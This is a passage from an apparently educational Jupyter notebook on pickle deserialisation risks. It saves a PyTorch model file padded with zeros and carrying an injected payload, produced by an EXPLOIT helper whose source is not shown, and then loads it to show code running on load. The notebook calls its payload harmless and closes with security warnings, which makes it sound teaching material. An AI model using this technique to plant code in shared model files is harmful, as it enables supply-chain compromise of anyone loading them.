,-3.4465671948754903,-0.23316237847996585,1.3381989269926302,-3.4656275885736565,0.3145875852506587],\"type\":\"scatter\"}],                        {\"template\":{\"data\":{\"barpolar\":[{\"marker\":{\"line\":{\"color\":\"rgb(17,17,17)\",\"width\":0.5},\"pattern\":{\"fillmode\":\"overlay\",\"size\":10,\"solidity\":0.2}},\"type\":\"barpolar\"}],\"bar\":[{\"error_x\":{\"color\":\"#f2f5fa\"},\"error_y\":{\"color\":\"#f2f5fa\"},\"marker\":{\"line\":{\"color\":\"rgb(17,17,17)\",\"width\":0.5},\"pattern\":{\"fillmode\":\"overlay\",\"size\":10,\"solidity\":0.2}},\"type\":\"bar\"}],\"carpet\":[{\"aaxis\":{\"endlinecolor\":\"#A2B1C6\",\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"minorgridcolor\":\"#506784\",\"startlinecolor\":\"#A2B1C6\"},\"baxis\":{\"endlinecolor\":\"#A2B1C6\",\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"minorgridcolor\":\"#506784\",\"startlinecolor\":\"#A2B1C6\"},\"type\":\"carpet\"}],\"choropleth\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"type\":\"choropleth\"}],\"contourcarpet\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"type\":\"contourcarpet\"}],\"contour\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"contour\"}],\"heatmapgl\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"heatmapgl\"}],\"heatmap\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"heatmap\"}],\"histogram2dcontour\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"histogram2dcontour\"}],\"histogram2d\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"histogram2d\"}],\"histogram\":[{\"marker\":{\"pattern\":{\"fillmode\":\"overlay\",\"size\":10,\"solidity\":0.2}},\"type\":\"histogram\"}],\"mesh3d\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"type\":\"mesh3d\"}],\"parcoords\":[{\"line\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"parcoords\"}],\"pie\":[{\"automargin\":true,\"type\":\"pie\"}],\"scatter3d\":[{\"line\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scatter3d\"}],\"scattercarpet\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scattercarpet\"}],\"scattergeo\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scattergeo\"}],\"scattergl\":[{\"marker\":{\"line\":{\"color\":\"#283442\"}},\"type\":\"scattergl\"}],\"scattermapbox\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scattermapbox\"}],\"scatterpolargl\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scatterpolargl\"}],\"scatterpolar\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scatterpolar\"}],\"scatter\":[{\"marker\":{\"line\":{\"color\":\"#283442\"}},\"type\":\"scatter\"}],\"scatterternary\":[{\"marker\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"type\":\"scatterternary\"}],\"surface\":[{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"},\"colorscale\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"type\":\"surface\"}],\"table\":[{\"cells\":{\"fill\":{\"color\":\"#506784\"},\"line\":{\"color\":\"rgb(17,17,17)\"}},\"header\":{\"fill\":{\"color\":\"#2a3f5f\"},\"line\":{\"color\":\"rgb(17,17,17)\"}},\"type\":\"table\"}]},\"layout\":{\"annotationdefaults\":{\"arrowcolor\":\"#f2f5fa\",\"arrowhead\":0,\"arrowwidth\":1},\"autotypenumbers\":\"strict\",\"coloraxis\":{\"colorbar\":{\"outlinewidth\":0,\"ticks\":\"\"}},\"colorscale\":{\"diverging\":[[0,\"#8e0152\"],[0.1,\"#c51b7d\"],[0.2,\"#de77ae\"],[0.3,\"#f1b6da\"],[0.4,\"#fde0ef\"],[0.5,\"#f7f7f7\"],[0.6,\"#e6f5d0\"],[0.7,\"#b8e186\"],[0.8,\"#7fbc41\"],[0.9,\"#4d9221\"],[1,\"#276419\"]],\"sequential\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]],\"sequentialminus\":[[0.0,\"#0d0887\"],[0.1111111111111111,\"#46039f\"],[0.2222222222222222,\"#7201a8\"],[0.3333333333333333,\"#9c179e\"],[0.4444444444444444,\"#bd3786\"],[0.5555555555555556,\"#d8576b\"],[0.6666666666666666,\"#ed7953\"],[0.7777777777777778,\"#fb9f3a\"],[0.8888888888888888,\"#fdca26\"],[1.0,\"#f0f921\"]]},\"colorway\":[\"#636efa\",\"#EF553B\",\"#00cc96\",\"#ab63fa\",\"#FFA15A\",\"#19d3f3\",\"#FF6692\",\"#B6E880\",\"#FF97FF\",\"#FECB52\"],\"font\":{\"color\":\"#f2f5fa\"},\"geo\":{\"bgcolor\":\"rgb(17,17,17)\",\"lakecolor\":\"rgb(17,17,17)\",\"landcolor\":\"rgb(17,17,17)\",\"showlakes\":true,\"showland\":true,\"subunitcolor\":\"#506784\"},\"hoverlabel\":{\"align\":\"left\"},\"hovermode\":\"closest\",\"mapbox\":{\"style\":\"dark\"},\"paper_bgcolor\":\"rgb(17,17,17)\",\"plot_bgcolor\":\"rgb(17,17,17)\",\"polar\":{\"angularaxis\":{\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"ticks\":\"\"},\"bgcolor\":\"rgb(17,17,17)\",\"radialaxis\":{\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"ticks\":\"\"}},\"scene\":{\"xaxis\":{\"backgroundcolor\":\"rgb(17,17,17)\",\"gridcolor\":\"#506784\",\"gridwidth\":2,\"linecolor\":\"#506784\",\"showbackground\":true,\"ticks\":\"\",\"zerolinecolor\":\"#C8D4E3\"},\"yaxis\":{\"backgroundcolor\":\"rgb(17,17,17)\",\"gridcolor\":\"#506784\",\"gridwidth\":2,\"linecolor\":\"#506784\",\"showbackground\":true,\"ticks\":\"\",\"zerolinecolor\":\"#C8D4E3\"},\"zaxis\":{\"backgroundcolor\":\"rgb(17,17,17)\",\"gridcolor\":\"#506784\",\"gridwidth\":2,\"linecolor\":\"#506784\",\"showbackground\":true,\"ticks\":\"\",\"zerolinecolor\":\"#C8D4E3\"}},\"shapedefaults\":{\"line\":{\"color\":\"#f2f5fa\"}},\"sliderdefaults\":{\"bgcolor\":\"#C8D4E3\",\"bordercolor\":\"rgb(17,17,17)\",\"borderwidth\":1,\"tickwidth\":0},\"ternary\":{\"aaxis\":{\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"ticks\":\"\"},\"baxis\":{\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"ticks\":\"\"},\"bgcolor\":\"rgb(17,17,17)\",\"caxis\":{\"gridcolor\":\"#506784\",\"linecolor\":\"#506784\",\"ticks\":\"\"}},\"title\":{\"x\":0.05},\"updatemenudefaults\":{\"bgcolor\":\"#506784\",\"borderwidth\":0},\"xaxis\":{\"automargin\":true,\"gridcolor\":\"#283442\",\"linecolor\":\"#506784\",\"ticks\":\"\",\"title\":{\"standoff\":15},\"zerolinecolor\":\"#283442\",\"zerolinewidth\":2},\"yaxis\":{\"automargin\":true,\"gridcolor\":\"#283442\",\"linecolor\":\"#506784\",\"ticks\":\"\",\"title\":{\"standoff\":15},\"zerolinecolor\":\"#283442\",\"zerolinewidth\":2}}},\"title\":{\"text\":\"Loaded Model Still Works!\"},\"paper_bgcolor\":\"rgba(0, 0, 0, 0)\",\"plot_bgcolor\":\"rgba(0, 0, 0, 0)\"},                        {\"responsive\": true}                    ).then(function(){\n",
       "                            \n",
       "var gd = document.getElementById('38bc6c37-40f7-4a41-94d6-b5830ee21375');\n",
       "var x = new MutationObserver(function (mutations, observer) {{\n",
       "        var display = window.getComputedStyle(gd).display;\n",
       "        if (!display || display === 'none') {{\n",
       "            console.log([gd, 'removed!']);\n",
       "            Plotly.purge(gd);\n",
       "            observer.disconnect();\n",
       "        }}\n",
       "}});\n",
       "\n",
       "// Listen for the removal of the full notebook cells\n",
       "var notebookContainer = gd.closest('#notebook-container');\n",
       "if (notebookContainer) {{\n",
       "    x.observe(notebookContainer, {childList: true});\n",
       "}}\n",
       "\n",
       "// Listen for the clearing of the current output cell\n",
       "var outputEl = gd.closest('.output');\n",
       "if (outputEl) {{\n",
       "    x.observe(outputEl, {childList: true});\n",
       "}}\n",
       "\n",
       "                        })                };                            </script>        </div>\n",
       "</body>\n",
       "</html>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import plotly.graph_objects as go\n",
    "import numpy as np\n",
    "with open(r\"bad_pickle\", \"rb\") as fp:\n",
    "    my_dict = pickle.load(fp)\n",
    "    fp.close()\n",
    "\n",
    "print(my_dict)\n",
    "\n",
    "w0 = my_dict['w']\n",
    "b0 = my_dict['b']\n",
    "\n",
    "\n",
    "x = np.random.randn(200)*2\n",
    "noise = np.random.normal(1, 20, 200)*0.05\n",
    "y = x + noise\n",
    "\n",
    "model_LR = np.dot(x, w0) + b0\n",
    "\n",
    "fig = go.Figure(data=go.Scatter(\n",
    "    x=x, y=y, mode='markers', name='Mystery Function'))\n",
    "fig.update_layout(template='plotly_dark',\n",
    "                  title='Loaded Model Still Works!',\n",
    "                  paper_bgcolor='rgba(0, 0, 0, 0)',\n",
    "                  plot_bgcolor='rgba(0, 0, 0, 0)')\n",
    "fig.add_trace(go.Scatter(x=x, y=model_LR,\n",
    "              name=f'my_model = {round(w0, 4)} * x + {round(b0, 4)}'))\n",
    "\n",
    "\n",
    "fig.show()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "zYawHEJ_mirc"
   },
   "source": [
    "How might this affect ML engineers and practitioners in the field? Libraries like `HuggingFace` democratize ML research by sharing models for n types of tasks. However, nothing prevents an attacker from uploading a model to the platform (or code-sharing platform, e.g., `GitHub`) that contains malicious code to be executed during upload.\n",
    "\n",
    "Below, we have created an `.pt` file (a machine learning model created using PyTorch) containing nothing but \"222.222.222 zeros\" and a malicious executable.\n",
    "\n",
    "A malicious attacker could save such a model (or a totally legitimate model), send it to a public repository, make a good advertisement for his `ultimate_model_to_rule_all_models`, and hope that curiosity will lure victims into his trap."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "id": "IFRGkn71mirc"
   },
   "outputs": [],
   "source": [
    "import torch\n",
    "\n",
    "junk = torch.zeros(222222222)\n",
    "\n",
    "model = {\n",
    "    \"ultimate_model_to_rule_all_models\": junk,\n",
    "}\n",
    "\n",
    "ultimate_model = EXPLOIT(inject_src, **model)\n",
    "\n",
    "torch.save(ultimate_model, 'ultimate_model_to_rule_all_models.pt')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "t30btWNimirc"
   },
   "source": [
    "⚠️Warning! ONLY EXECUTE THE NEXT CELL IF YOU WANT TO EXECUTE THE PAYLOAD (THE ONE PROVIDED IN THIS ORIGINAL NOTEBOOK IS HARMLESS).⚠️\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {
    "colab": {
     "base_uri": "https://localhost:8080/"
    },
    "id": "it7OIycomirc",
    "outputId": "3bd6a919-62d1-4218-e9ac-43589a8688c3"
   },
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "<ipython-input-10-9ed116e86a15>:1: FutureWarning:\n",
      "\n",
      "You are using `torch.load` with `weights_only=False` (the current default value), which uses the default pickle module implicitly. It is possible to construct malicious pickle data which will execute arbitrary code during unpickling (See https://github.com/pytorch/pytorch/blob/main/SECURITY.md#untrusted-models for more details). In a future release, the default value for `weights_only` will be flipped to `True`. This limits the functions that could be executed during unpickling. Arbitrary objects will no longer be allowed to be loaded via this mode unless they are explicitly allowlisted by the user via `torch.serialization.add_safe_globals`. We recommend you start setting `weights_only=True` for any use case where you don't have full control of the loaded file. Please open an issue on GitHub for any issues related to this experimental feature.\n",
      "\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'ultimate_model_to_rule_all_models': tensor([0., 0., 0.,  ..., 0., 0., 0.])}\n"
     ]
    }
   ],
   "source": [
    "model = torch.load('ultimate_model_to_rule_all_models.pt')\n",
    "\n",
    "print(model)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "-r0-2_lAmird"
   },
   "source": [
    "The story's moral is that you should take the warnings in the `Pickle` and `Pytorch` library documentation seriously.\n",
    "\n",
    "> [Warning](https://docs.python.org/3/library/pickle.html): The `pickle` module is not secure. Only unpickle data you trust. Constructing malicious pickle data to execute arbitrary code during unpickling is possible.\n",
    "\n",
    "As a precaution, one possible security measure would involve only loading templates from unverified sources into virtual machines. Stay safe, folks! 🙃\n",
    "\n",
    "---\n",
    "\n",
    "Return to the [castle](https://github.com/Nkluge-correa/teeny-tiny_castle).\n"
   ]
  }
 ],
 "metadata": {
  "colab": {
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "aca09746cf57686f00a55ae76e987247ecfb5dd0b3b2e2474d8dbbf0c5e3377e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
